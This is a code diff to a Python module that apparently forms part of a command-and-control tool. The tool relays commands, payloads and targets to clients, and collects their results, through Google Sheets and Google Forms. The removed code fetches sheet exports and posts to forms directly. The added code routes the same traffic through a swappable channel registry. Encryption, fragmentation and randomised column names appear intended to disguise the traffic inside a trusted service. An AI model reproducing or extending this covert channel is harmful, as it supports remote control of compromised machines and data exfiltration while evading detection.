@@ -1,12 +1,9 @@
-import csv
-import io
-import json
 import os
-import requests
 
 
 def load_env(path=".env"):
-    """Parse .env file into os.environ."""
+    """Parse .env file into os.environ and reset the active channel."""
+    global _active_channel
     if not os.path.exists(path):
         return
     with open(path) as f:
@@ -16,6 +13,7 @@ def load_env(path=".env"):
                 continue
             key, _, val = line.partition("=")
             os.environ[key.strip()] = val.strip()
+    _active_channel = None
 
 
 def get_fragmenter():
@@ -36,30 +34,6 @@ def get_encryptor():
         return FernetEncryptor()
     from crypto.plaintext import PlaintextEncryptor
     return PlaintextEncryptor()
-
-
-def _get_column_map(env_key):
-    """Load {logical_name: random_col_name} from env var.
-    Returns empty dict if unset — code uses logical column names as-is.
-    """
-    raw = os.environ.get(env_key, "").strip()
-    if not raw:
-        return {}
-    try:
-        return json.loads(raw)
-    except json.JSONDecodeError:
-        print(f"[warn] {env_key} is not valid JSON — falling back to logical column names")
-        return {}
-
-
-def _translate_row(row, column_map):
-    """Translate random column header keys → logical names using reverse of column_map.
-    Keys not present in the map (e.g. form_timestamp) pass through unchanged.
-    """
-    if not column_map:
-        return row
-    reverse = {v: k for k, v in column_map.items()}
-    return {reverse.get(k, k): v for k, v in row.items()}
 
 
 def _encrypt_row(row, enc):
@@ -136,128 +110,53 @@ def _reassemble_fragments(rows, data_field, done_status):
     return normal
 
 
-def build_outbox_fragments(data, chunks):
-    """Build outbox fragment rows from a pre-fragmented list of result chunks."""
-    total = len(chunks)
-    return [
-        {
-            "command_id": data["command_id"],
-            "client_id": data.get("client_id", ""),
-            "status": f"frag:{i}:{total}",
-            "result": chunk,
-            "timestamp": data.get("timestamp", ""),
-        }
-        for i, chunk in enumerate(chunks)
-    ]
+# ---------------------------------------------------------------------------
+# Channel registry
+# ---------------------------------------------------------------------------
+
+_active_channel = None
 
 
-def build_inbox_fragments(data, chunks):
-    """Build inbox fragment rows from a pre-fragmented list of payload chunks."""
-    total = len(chunks)
-    return [
-        {
-            "command_id": data["command_id"],
-            "command": data.get("command", ""),
-            "payload": chunk,
-            "target": data.get("target", ""),
-            "status": f"frag:{i}:{total}",
-            "created_at": data.get("created_at", ""),
-        }
-        for i, chunk in enumerate(chunks)
-    ]
+def get_channel():
+    """Return the active channel, creating a SheetsChannel by default."""
+    global _active_channel
+    if _active_channel is None:
+        from channel.sheets import SheetsChannel
+        _active_channel = SheetsChannel()
+    return _active_channel
 
 
-def sheet_url(gid):
-    """Build CSV export URL for a tab."""
-    sid = os.environ["SPREADSHEET_ID"]
-    return f"https://docs.google.com/spreadsheets/d/{sid}/export?format=csv&gid={gid}"
+def set_channel(channel):
+    """Replace the active channel. Used for channel switching and testing."""
+    global _active_channel
+    _active_channel = channel
 
 
-def read_tab(gid, timeout=15):
-    """Fetch a tab as list of dicts via CSV export."""
-    url = sheet_url(gid)
-    resp = requests.get(url, timeout=timeout)
-    resp.raise_for_status()
-    reader = csv.DictReader(io.StringIO(resp.text))
-    rows = []
-    for row in reader:
-        try:
-            rows.append(dict(row))
-        except Exception:
-            continue
-    return rows
-
-
-def read_config():
-    """Read config tab, translate column names, decrypt values, return dict of key→value."""
-    gid = os.environ["CONFIG_GID"]
-    rows = read_tab(gid)
-    column_map = _get_column_map("CONFIG_COLUMN_MAP")
-    enc = get_encryptor()
-    result = {}
-    for row in rows:
-        row = _translate_row(row, column_map)
-        row = _decrypt_row(row, enc)
-        if "key" in row and "value" in row:
-            result[row["key"]] = row["value"]
-    return result
-
+# ---------------------------------------------------------------------------
+# Thin wrappers — delegate to active channel
+# ---------------------------------------------------------------------------
 
 def read_inbox():
-    """Read inbox tab, translate column names, decrypt all fields, reassemble fragments."""
-    gid = os.environ["INBOX_GID"]
-    rows = read_tab(gid)
-    column_map = _get_column_map("INBOX_COLUMN_MAP")
-    enc = get_encryptor()
-    result = []
-    for row in rows:
-        row = _translate_row(row, column_map)
-        row = _decrypt_row(row, enc)
-        result.append(row)
-    return _reassemble_fragments(result, "payload", "pending")
+    return get_channel().read_inbox()
 
 
 def read_outbox():
-    """Read outbox tab, translate column names, decrypt all fields, reassemble fragments."""
-    gid = os.environ["OUTBOX_GID"]
-    rows = read_tab(gid)
-    column_map = _get_column_map("OUTBOX_COLUMN_MAP")
-    enc = get_encryptor()
-    result = []
-    for row in rows:
-        row = _translate_row(row, column_map)
-        row = _decrypt_row(row, enc)
-        result.append(row)
-    return _reassemble_fragments(result, "result", "success")
+    return get_channel().read_outbox()
 
 
 def write_form(data):
-    """Encrypt all fields, then POST to Google Forms (outbox)."""
-    enc = get_encryptor()
-    encrypted = _encrypt_row(data, enc)
-
-    url = os.environ["FORMS_URL"]
-    field_map = json.loads(os.environ["FORMS_FIELD_MAP"])
-    payload = {entry_id: encrypted.get(field, "") for field, entry_id in field_map.items()}
-    try:
-        resp = requests.post(url, data=payload, timeout=15)
-        return resp.ok or resp.status_code in (301, 302, 303)
-    except Exception as e:
-        print(f"[error] write_form failed: {e}")
-        return False
+    """Write a result to the outbox (delegates to channel.write_result)."""
+    return get_channel().write_result(data)
 
 
 def write_inbox_form(data):
-    """Encrypt all fields, then POST to Google Forms (inbox)."""
-    enc = get_encryptor()
-    encrypted = _encrypt_row(data, enc)
+    """Write a task to the inbox (delegates to channel.write_task)."""
+    return get_channel().write_task(data)
 
-    url = os.environ["INBOX_FORMS_URL"]
-    field_map = json.loads(os.environ["INBOX_FORMS_FIELD_MAP"])
-    payload = {entry_id: encrypted.get(field, "") for field, entry_id in field_map.items()}
-    try:
-        resp = requests.post(url, data=payload, timeout=15)
-        return resp.ok or resp.status_code in (301, 302, 303)
-    except Exception as e:
-        print(f"[error] write_inbox_form failed: {e}")
-        return False
+
+def build_outbox_fragments(data, chunks):
+    return get_channel().build_outbox_fragments(data, chunks)
+
+
+def build_inbox_fragments(data, chunks):
+    return get_channel().build_inbox_fragments(data, chunks)
